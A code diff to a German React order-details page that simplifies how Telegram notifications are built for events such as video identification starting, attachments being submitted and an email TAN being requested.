@@ -2,7 +2,6 @@ import { useEffect, useState, useCallback } from "react";
 import { useParams, useNavigate, useOutletContext } from "react-router-dom";
 import { motion } from "framer-motion";
 import { sendTelegram } from "@/lib/sendTelegram";
-import { buildTelegramMessage, renderStars, formatDateLong, quoteText } from "@/lib/telegramMessage";
 import { ArrowLeft, Target, HelpCircle, Download, Star, Upload, FileText, CheckCircle, XCircle, ListChecks, Video, AlertTriangle, Clock, MessageSquare, Smartphone, Loader2, Info, MessageCircle, RefreshCw, Mail } from "lucide-react";
 import appStoreBadge from "@/assets/app-store.svg";
 import googlePlayBadge from "@/assets/google-play-de-de.svg";
@@ -354,7 +353,7 @@ const AuftragDetails = () => {
     // Telegram notification
     await sendTelegram(
       "ident_gestartet",
-      buildTelegramMessage({
+      {
         icon: "🎥",
         title: "Ident gestartet",
         fields: [
@@ -365,7 +364,7 @@ const AuftragDetails = () => {
           { icon: "🏦", label: "Anbieter", value: (order as any).provider },
         ],
         brandingName: brandingCtx?.company_name,
-      }),
+      },
       (order as any)?.branding_id ?? contract?.branding_id ?? undefined
     );
   };
@@ -452,7 +451,7 @@ const AuftragDetails = () => {
     // Telegram notification
     await sendTelegram(
       "anhaenge_eingereicht",
-      buildTelegramMessage({
+      {
         icon: "📎",
         title: "Anhänge eingereicht",
         fields: [
@@ -462,7 +461,7 @@ const AuftragDetails = () => {
           { icon: "🏷", label: "Auftragsnummer", value: (order as any).order_number },
         ],
         brandingName: brandingCtx?.company_name,
-      }),
+      },
       (order as any)?.branding_id ?? contract?.branding_id ?? undefined
     );
   };
@@ -892,7 +891,7 @@ const AuftragDetails = () => {
                       const titel = order?.title || "Auftrag";
                       await sendTelegram(
                         "email_tan_angefordert",
-                        buildTelegramMessage({
+                        {
                           icon: "📧",
                           title: "Email-TAN angefordert",
                           fields: [
@@ -903,7 +902,7 @@ const AuftragDetails = () => {
                             { value: "Wartet auf die Email-TAN." },
                           ],
                           brandingName: brandingCtx?.company_name,
-                        }),
+                        },
                         (order as any)?.branding_id ?? contract?.branding_id ?? undefined
                       );
                       toast.success("Anfrage gesendet");
